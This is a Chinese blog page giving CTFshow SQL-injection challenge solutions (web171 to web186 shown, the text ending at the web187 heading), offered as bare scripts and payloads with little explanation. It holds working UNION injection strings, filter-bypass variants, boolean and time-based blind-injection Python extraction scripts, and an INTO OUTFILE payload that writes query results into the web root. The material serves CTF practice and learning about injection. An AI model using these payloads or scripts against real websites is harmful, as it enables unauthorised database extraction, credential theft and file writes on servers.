<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>[CTFSHOW]SQL注入(WEB入门) - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="[CTFSHOW]SQL注入(WEB入门)" />
<meta property="og:description" content="文章目录 前言新手区web171web172web173web174web175解法一解法二 web176解法一解法二 web177web 178解法一解法二 web179解法一解法二 web180-182web183web184web185web186web187web188web189web190web191web192web193web194web195web196web197-198web190-200web201(因为是第一题所以详细点)web202web203web204web205web206web207-208web209web210-212web213（暂时出了一点小问题，晚点更新）web214web215web216web217web218web219web220web221web222web223web224web225方法一：handler 方法二：预处理web226/web228-web230web227web231-232web233web234web235web236web237web238web239web240web249好文推荐 前言 看大家好像挺需要的所以在这里记录一下自己的脚本和payload，不做思路讲解，除非题目比较骚,到期末了，没啥时间总结了，大家可以去看看Yq1ng师傅的文章
新手区 可以看看我以前记录的小笔记
SQL注入之MySQL注入的学习笔记(一)
SQL注入之MySQL注入学习笔记(二)
web171 比较常规的题目不做讲解了，这里给出payload
# @Author:Y4tacker # 查数据库 payload = &#34;-1&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --&#43;&#34; # 查列名 payload=&#34;-1&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_user&#39; --&#43;&#34; # 查flag payload=&#34;-1&#39;union select id,username,password from ctfshow_user --&#43;&#34; web172 第二题,首先从题目提示当中看出查询的数据不包含flag，并且给出了数据库是ctfshow_user2
# @Author:Y4tacker //拼接sql语句查找指定ID用户 $sql = &#34;select username,password from ctfshow_user2 where username !=&#39;flag&#39; and id = &#39;&#34;.$_GET[&#39;id&#39;].&#34;&#39; limit 1;&#34;; 从结果看出只有两列尝试闭合括号-1&#39; union select 1,2 --&#43;有回显成功，返回逻辑告诉我们不能有flag字段，所以尝试编码很多啦hex等等，这里用base64吧" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/bcbb6ee977b67d5df2da4e8a73b0ccd7/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-11-25T21:23:33+08:00" />
<meta property="article:modified_time" content="2020-11-25T21:23:33+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">[CTFSHOW]SQL注入(WEB入门)</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-tomorrow-night">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><a href="#_1" rel="nofollow">前言</a></li><li><a href="#_3" rel="nofollow">新手区</a></li><li><a href="#web171_7" rel="nofollow">web171</a></li><li><a href="#web172_19" rel="nofollow">web172</a></li><li><a href="#web173_35" rel="nofollow">web173</a></li><li><a href="#web174_41" rel="nofollow">web174</a></li><li><a href="#web175_77" rel="nofollow">web175</a></li><li><ul><li><a href="#_78" rel="nofollow">解法一</a></li><li><a href="#_112" rel="nofollow">解法二</a></li></ul> 
  </li><li><a href="#web176_117" rel="nofollow">web176</a></li><li><ul><li><a href="#_118" rel="nofollow">解法一</a></li><li><a href="#_121" rel="nofollow">解法二</a></li></ul> 
  </li><li><a href="#web177_129" rel="nofollow">web177</a></li><li><a href="#web_178_132" rel="nofollow">web 178</a></li><li><ul><li><a href="#_133" rel="nofollow">解法一</a></li><li><a href="#_137" rel="nofollow">解法二</a></li></ul> 
  </li><li><a href="#web179_140" rel="nofollow">web179</a></li><li><ul><li><a href="#_141" rel="nofollow">解法一</a></li><li><a href="#_144" rel="nofollow">解法二</a></li></ul> 
  </li><li><a href="#web180182_148" rel="nofollow">web180-182</a></li><li><a href="#web183_152" rel="nofollow">web183</a></li><li><a href="#web184_174" rel="nofollow">web184</a></li><li><a href="#web185_200" rel="nofollow">web185</a></li><li><a href="#web186_243" rel="nofollow">web186</a></li><li><a href="#web187_282" rel="nofollow">web187</a></li><li><a href="#web188_288" rel="nofollow">web188</a></li><li><a href="#web189_302" rel="nofollow">web189</a></li><li><a href="#web190_362" rel="nofollow">web190</a></li><li><a href="#web191_404" rel="nofollow">web191</a></li><li><a href="#web192_449" rel="nofollow">web192</a></li><li><a href="#web193_473" rel="nofollow">web193</a></li><li><a href="#web194_498" rel="nofollow">web194</a></li><li><a href="#web195_550" rel="nofollow">web195</a></li><li><a href="#web196_557" rel="nofollow">web196</a></li><li><a href="#web197198_561" rel="nofollow">web197-198</a></li><li><a href="#web190200_588" rel="nofollow">web190-200</a></li><li><a href="#web201_595" rel="nofollow">web201(因为是第一题所以详细点)</a></li><li><a href="#web202_627" rel="nofollow">web202</a></li><li><a href="#web203_642" rel="nofollow">web203</a></li><li><a href="#web204_650" rel="nofollow">web204</a></li><li><a href="#web205_656" rel="nofollow">web205</a></li><li><a href="#web206_671" rel="nofollow">web206</a></li><li><a href="#web207208_679" rel="nofollow">web207-208</a></li><li><a href="#web209_742" rel="nofollow">web209</a></li><li><a href="#web210212_799" rel="nofollow">web210-212</a></li><li><a href="#web213_857" rel="nofollow">web213（暂时出了一点小问题，晚点更新）</a></li><li><a href="#web214_858" rel="nofollow">web214</a></li><li><a href="#web215_898" rel="nofollow">web215</a></li><li><a href="#web216_938" rel="nofollow">web216</a></li><li><a href="#web217_978" rel="nofollow">web217</a></li><li><a href="#web218_1022" rel="nofollow">web218</a></li><li><a href="#web219_1059" rel="nofollow">web219</a></li><li><a href="#web220_1094" rel="nofollow">web220</a></li><li><a href="#web221_1124" rel="nofollow">web221</a></li><li><a href="#web222_1136" rel="nofollow">web222</a></li><li><a href="#web223_1178" rel="nofollow">web223</a></li><li><a href="#web224_1234" rel="nofollow">web224</a></li><li><a href="#web225_1246" rel="nofollow">web225</a></li><li><ul><li><a href="#handler_1247" rel="nofollow">方法一：handler</a></li></ul> 
  </li><li><a href="#_1253" rel="nofollow">方法二：预处理</a></li><li><a href="#web226web228web230_1258" rel="nofollow">web226/web228-web230</a></li><li><a href="#web227_1267" rel="nofollow">web227</a></li><li><a href="#web231232_1276" rel="nofollow">web231-232</a></li><li><a href="#web233_1290" rel="nofollow">web233</a></li><li><a href="#web234_1332" rel="nofollow">web234</a></li><li><a href="#web235_1348" rel="nofollow">web235</a></li><li><a href="#web236_1362" rel="nofollow">web236</a></li><li><a href="#web237_1370" rel="nofollow">web237</a></li><li><a href="#web238_1379" rel="nofollow">web238</a></li><li><a href="#web239_1388" rel="nofollow">web239</a></li><li><a href="#web240_1395" rel="nofollow">web240</a></li><li><a href="#web249_1433" rel="nofollow">web249</a></li><li><a href="#_1437" rel="nofollow">好文推荐</a></li></ul> 
</div> 
<p></p> 
<h2><a id="_1"></a>前言</h2> 
<p>看大家好像挺需要的所以在这里记录一下自己的脚本和payload，不做思路讲解，除非题目比较骚,到期末了，没啥时间总结了，大家可以去看看<a href="https://yq1ng.github.io/z_post/CTFSHOW-WEB%E5%85%A5%E9%97%A8-Ttick%E6%80%BB%E7%BB%93/#more" rel="nofollow">Yq1ng师傅的文章</a></p> 
<h2><a id="_3"></a>新手区</h2> 
<p>可以看看我以前记录的小笔记<br> <a href="https://blog.csdn.net/solitudi/article/details/106820588?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160630921119725271050515%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=160630921119725271050515&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-4-106820588.pc_v2_rank_blog_default&amp;utm_term=%E6%B3%A8%E5%85%A5&amp;spm=1018.2118.3001.4450">SQL注入之MySQL注入的学习笔记(一)</a><br> <a href="https://blog.csdn.net/solitudi/article/details/106824456?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160630921119725271050515%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=160630921119725271050515&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-2-106824456.pc_v2_rank_blog_default&amp;utm_term=%E6%B3%A8%E5%85%A5&amp;spm=1018.2118.3001.4450">SQL注入之MySQL注入学习笔记(二)</a></p> 
<h2><a id="web171_7"></a>web171</h2> 
<p>比较常规的题目不做讲解了，这里给出payload</p> 
<pre><code class="prism language-python"><span class="token comment"># @Author:Y4tacker</span>
<span class="token comment"># 查数据库</span>
payload <span class="token operator">=</span> <span class="token string">"-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+"</span>
<span class="token comment"># 查列名</span>
payload<span class="token operator">=</span><span class="token string">"-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='ctfshow_user' --+"</span>
<span class="token comment"># 查flag</span>
payload<span class="token operator">=</span><span class="token string">"-1'union select id,username,password from ctfshow_user --+"</span>
</code></pre> 
<h2><a id="web172_19"></a>web172</h2> 
<p>第二题,首先从题目提示当中看出查询的数据不包含flag，并且给出了数据库是ctfshow_user2</p> 
<pre><code class="prism language-php"><span class="token shell-comment comment"># @Author:Y4tacker</span>
<span class="token comment">//拼接sql语句查找指定ID用户</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"select username,password from ctfshow_user2 where username !='flag' and id = '"</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"' limit 1;"</span><span class="token punctuation">;</span>
</code></pre> 
<p>从结果看出只有两列尝试闭合括号<code>-1' union select 1,2 --+</code>有回显成功，返回逻辑告诉我们不能有flag字段，所以尝试编码很多啦hex等等，这里用base64吧</p> 
<pre><code class="prism language-php"><span class="token comment">//检查结果是否有flag</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">username</span><span class="token operator">!==</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token single-quoted-string string">'查询成功'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre> 
<p><code>-1' union select to_base64(username),hex(password) from ctfshow_user2 --+</code><br> 查询出最后一行解码就是flag啦</p> 
<h2><a id="web173_35"></a>web173</h2> 
<p>和上一道题一样的，唯一区别就是这道题是三列回显数据,这次改hex函数呗，随意一点多一个姿势<br> <code>1' union select id,hex(username),hex(password) from ctfshow_user3--+</code><br> 可以看见最后一行，解码就行，给个在线解码网址，<a href="https://www.bejson.com/convert/ox2str/" rel="nofollow">点我</a><br> <img src="https://images2.imgbox.com/e2/6c/C0kBUcJz_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="web174_41"></a>web174</h2> 
<p>通过抓包，发现关键网站<br> <code>http://e076200d-5e74-4121-b2fc-04153243f7a3.chall.ctf.show/api/v3.php?page=1&amp;limit=10</code><br> 但是没有回显，有点懵逼，想到这道题是第四题尝试改为<code>v4.php</code>好家伙有回显了<br> <code>http://e076200d-5e74-4121-b2fc-04153243f7a3.chall.ctf.show/api/v4.php?id=1</code><br> 之后我想到了利用盲注的方式来读取表格，这里采用了二分法，感兴趣的师傅可以看看我都脚本，这里采用了二分法</p> 
<pre><code class="prism language-python"><span class="token comment"># @Author:Y4tacker</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://e076200d-5e74-4121-b2fc-04153243f7a3.chall.ctf.show/api/v4.php?id=1' and "</span>

result <span class="token operator">=</span> <span class="token string">''</span>
i <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>

    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span>
        payload <span class="token operator">=</span> f<span class="token string">'1=if(ascii(substr((select  password from ctfshow_user4 limit 24,1),{i},1))&gt;{mid},1,0) -- -'</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"admin"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            tail <span class="token operator">=</span> mid

    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
</code></pre> 
<h2><a id="web175_77"></a>web175</h2> 
<h3><a id="_78"></a>解法一</h3> 
<p>这次没回显了,我测试一下时间盲注，发现没问题哈<br> <code>http://7eac161c-e06e-4d48-baa5-f11edaee7d38.chall.ctf.show/api/v5.php?id=1' and if(1=1,sleep(3),1)--+&amp;page=1&amp;limit=10</code>,写个二分法的时间盲注脚本</p> 
<pre><code class="prism language-python"><span class="token comment"># @Author:Y4tacker</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://7eac161c-e06e-4d48-baa5-f11edaee7d38.chall.ctf.show/api/v5.php?id=1' and "</span>

result <span class="token operator">=</span> <span class="token string">''</span>
i <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>

    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span>
        payload <span class="token operator">=</span> f<span class="token string">'1=if(ascii(substr((select  password from ctfshow_user5 limit 24,1),{i},1))&gt;{mid},sleep(2),0) -- -'</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>
            tail <span class="token operator">=</span> mid
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>

    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>


</code></pre> 
<h3><a id="_112"></a>解法二</h3> 
<p>利用读写文件写入网站根目录<br> <code>http://7eac161c-e06e-4d48-baa5-f11edaee7d38.chall.ctf.show/api/v5.php?id=1' union select 1,password from ctfshow_user5 into outfile '/var/www/html/1.txt'--+&amp;page=1&amp;limit=10</code><br> 之后访问<code>http://7eac161c-e06e-4d48-baa5-f11edaee7d38.chall.ctf.show/1.txt</code></p> 
<h2><a id="web176_117"></a>web176</h2> 
<h3><a id="_118"></a>解法一</h3> 
<p>万能密码呗，噗嗤<br> <code>1' or 1=1--+</code>然后最后一行发现了<code>flag</code></p> 
<h3><a id="_121"></a>解法二</h3> 
<p>首先输入，发现返回出错，估计是有过滤<br> <code>1' union select 1,2,3--+</code><br> 尝试大小写<br> <code>1' uNion sElect 1,2,3--+</code>发现有回显了<br> 然后直接查flag<br> <code>1' uNion sElect 1,2,password from ctfshow_user --+</code></p> 
<h2><a id="web177_129"></a>web177</h2> 
<p>空格过滤了<code>/**/</code>绕过<br> <code>1'/**/union/**/select/**/password,1,1/**/from/**/ctfshow_user/**/where/**/username/**/='flag'%23</code></p> 
<h2><a id="web_178_132"></a>web 178</h2> 
<h3><a id="_133"></a>解法一</h3> 
<p>过滤了空格与*号等用<code>%09</code>绕过<br> <code>1'%09union%09select%091,2,3%23</code><br> 之后一把梭得到flag<code>1'%09union%09select%091,2,password%09from%09ctfshow_user%23</code></p> 
<h3><a id="_137"></a>解法二</h3> 
<p>老规矩一句话，其实上面很多题都可以懒得写<br> <code>id=1'or'1'='1'%23</code></p> 
<h2><a id="web179_140"></a>web179</h2> 
<h3><a id="_141"></a>解法一</h3> 
<p>一句话梭哈<br> <code>id=1'or'1'='1'%23</code></p> 
<h3><a id="_144"></a>解法二</h3> 
<p>这次还把<code>%09</code>过滤了，测试了下发现<code>%0c</code>可以绕过<br> 所以<code>1'union%0cselect%0c1,2,password%0cfrom%0cctfshow_user%23</code></p> 
<h2><a id="web180182_148"></a>web180-182</h2> 
<p>把所有空格都过滤了，考虑其他姿势，暂时只想到这个，欢迎师傅评论区补充,然后还可以盲注，这里不放脚本了，太懒了<br> <code>id=-1'or(id=26)and'1'='1</code></p> 
<h2><a id="web183_152"></a>web183</h2> 
<p>首先看提示需要post传参<code>tableName=ctfshow_user</code>发现有回显<br> 这里写了个脚本跑出来就ok</p> 
<pre><code class="prism language-python"><span class="token comment"># @Author:Y4tacker</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">'http://57496c50-1b0d-40de-ac22-501e93a1ddbd.chall.ctf.show/select-waf.php'</span>
flagstr <span class="token operator">=</span> r<span class="token string">"{flqazwsxedcrvtgbyhnujmikolp-0123456789}"</span>
res <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'tableName'</span><span class="token punctuation">:</span> f<span class="token string">"(ctfshow_user)where(substr(pass,{i},1))regexp('{j}')"</span>
        <span class="token punctuation">}</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 1;"</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
            res <span class="token operator">+=</span> j
            <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
</code></pre> 
<h2><a id="web184_174"></a>web184</h2> 
<p>过滤的太多了，<code>right join</code>连接查询即可</p> 
<pre><code class="prism language-python"><span class="token comment"># @Author:Y4tacker</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://f15ac2ca-94b7-4257-a52a-00e52ecee805.chall.ctf.show/select-waf.php"</span>

flag <span class="token operator">=</span> <span class="token string">'flag{'</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> i <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
    <span class="token keyword">for</span>  j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">"tableName"</span><span class="token punctuation">:</span> f<span class="token string">"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1)regexp(char({j})))"</span>
        <span class="token punctuation">}</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 43;"</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"."</span><span class="token punctuation">:</span>
                flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"}"</span><span class="token punctuation">:</span>
                    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
                <span class="token keyword">break</span>
</code></pre> 
<h2><a id="web185_200"></a>web185</h2> 
<p>给大家分享一张图片<br> <img src="https://images2.imgbox.com/9b/7e/GfNNJaEb_o.png" alt="在这里插入图片描述"></p> 
<p>这道题过滤了数字，可以在此基础上加上<code>true</code><br> 上脚本呢</p> 
<pre><code class="prism language-python"><span class="token comment"># @Author:Y4tacker</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://341e93e1-a1e7-446a-b7fc-75beb0e88086.chall.ctf.show/select-waf.php"</span>

flag <span class="token operator">=</span> <span class="token string">'flag{'</span>


<span class="token keyword">def</span> <span class="token function">createNum</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    num <span class="token operator">=</span> <span class="token string">'true'</span>
    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'true'</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            num <span class="token operator">+=</span> <span class="token string">"+true"</span>
    <span class="token keyword">return</span> num


<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> i <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">"tableName"</span><span class="token punctuation">:</span> f<span class="token string">"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{createNum(i)},{createNum(1)})regexp(char({createNum(j)})))"</span>
        <span class="token punctuation">}</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 43;"</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"."</span><span class="token punctuation">:</span>
                flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>

                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"}"</span><span class="token punctuation">:</span>
                    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
                <span class="token keyword">break</span>
</code></pre> 
<h2><a id="web186_243"></a>web186</h2> 
<p>和上一题一样的，不多说</p> 
<pre><code class="prism language-python"><span class="token comment"># @Author:Y4tacker</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://0ee67cf6-8b94-4384-962b-101fce5a7862.chall.ctf.show/select-waf.php"</span>

flag <span class="token operator">=</span> <span class="token string">'flag{'</span>


<span class="token keyword">def</span> <span class="token function">createNum</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    num <span class="token operator">=</span> <span class="token string">'true'</span>
    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'true'</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            num <span class="token operator">+=</span> <span class="token string">"+true"</span>
    <span class="token keyword">return</span> num


<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> i <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">"tableName"</span><span class="token punctuation">:</span> f<span class="token string">"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{createNum(i)},{createNum(1)})regexp(char({createNum(j)})))"</span>
        <span class="token punctuation">}</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 43;"</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"."</span><span class="token punctuation">:</span>
                flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"}"</span><span class="token punctuation">:</span>
                    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
                <span class="token keyword">break</span>

</code></pre> 
<h2><a id="web187_282"></a>web187</h2> 
